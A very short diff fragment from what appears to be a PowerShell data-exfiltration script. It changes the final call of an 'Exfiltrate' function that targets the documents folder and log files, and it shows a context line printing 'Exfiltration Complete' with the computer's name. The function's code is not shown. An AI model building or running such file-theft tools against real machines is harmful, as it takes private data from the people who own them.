@@ -65,4 +65,4 @@ Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 
 
 # Define What you want to search for (examples at the top)
-Exfiltrate -Path documents -FileType log
+Exfiltrate
